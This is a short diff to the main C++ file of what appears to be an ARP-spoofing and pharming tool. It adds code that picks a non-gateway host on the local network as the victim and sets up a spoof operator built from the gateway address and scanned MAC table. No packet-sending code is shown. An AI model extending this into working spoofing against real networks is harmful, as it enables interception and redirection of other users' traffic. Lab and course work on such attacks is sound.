@@ -19,13 +19,14 @@
 
 #include "arp.h"
 #include "scan.h"
+#include "spoof.h"
 #include "pharm_attack.h"
 
 
 int main()
 {
     std::string sender_mac, target_mac;
-    std::string sender_ip, netmask, ifname;
+    std::string sender_ip, target_ip, netmask, ifname;
     std::string gateway_ip;
     
     // iterate through all network interfaces
@@ -82,14 +83,19 @@ int main()
         }
     }
 
-    // send_packet(sock, ifindex, sender_ip, sender_mac, target_ip, target_mac);
+    // choose the first target that is not the gateway
+    std::map<std::string, std::string>::iterator it;
+    for (it = ip2mac_map.begin(); it != ip2mac_map.end(); it++) {
+        if (it->first != gateway_ip) {
+            target_ip = it->first;
+            target_mac = it->second;
+        }
+    }
+
+    // initialize the spoof operator
+    SpoofOperator spoof_operator(&arp_operator, gateway_ip, &ip2mac_map);
+
+    std::cout << "target: " << target_ip << " " << target_mac << std::endl;
 
     return 0;
-}
-
-void print_devices(std::vector<std::pair<std::string, std::string>> &answered_list)
-{
-    for (std::pair<std::string, std::string> addr_pair : answered_list) {
-        std::cout << addr_pair.first << " " << addr_pair.second << std::endl;
-    }
 }
